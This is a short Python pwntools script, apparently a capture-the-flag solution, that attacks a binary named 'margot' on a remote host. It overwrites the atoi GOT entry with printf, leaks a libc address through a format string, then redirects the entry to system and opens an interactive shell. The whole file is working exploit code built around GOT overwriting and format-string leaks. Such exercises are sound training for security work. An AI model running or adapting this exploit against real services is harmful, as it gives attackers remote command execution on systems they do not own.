from pwn import *
context.update(os = "linux", arch = "amd64", log_level = "debug")

#p = process("./margot")
p = remote("20.199.64.76", 7894)
elf = ELF("./margot")
libc = ELF("glibc/libc.so.6")
def sl(choix): p.sendlineafter("> ", str(choix))
def history(data):
    sl(2)
    p.sendlineafter("your task about? ", data)
    p.sendlineafter("[y/n]\n", b"n")
def h2(data):
    sl(2)
    p.sendafter("your task about? ", data)
    p.sendline("y")
def sploit(data):
    sl(3)
    p.send(data)
def m(data):
    sl(1)
    p.sendline(data)
def main():
    history(b"A"*8)
    sploit(p64(elf.got.atoi))
    h2(b"A" * 8)
    h2(p64(elf.plt.printf))
    m(b"%13$p")
    one = 0x4f322
    #m("%p")
    p.recvuntil("number x? ")
    leak = int(p.recvline().strip(b"\n"), 16) - libc.sym.__libc_start_main - 231
    print(hex(leak))
    #h2(b"A"*8)

    sploit(p64(leak + libc.sym.system))
    #m(p64(leak + one))
    #history(b"A"*8)
    #l = int(p.recvline(), 16) - libc.sym._IO_2_1_stdout_ - 131
    #print(hex(l))
    #payload = fmtstr_payload(write, 6)
    #gdb.attach(p)
    p.interactive()
main()
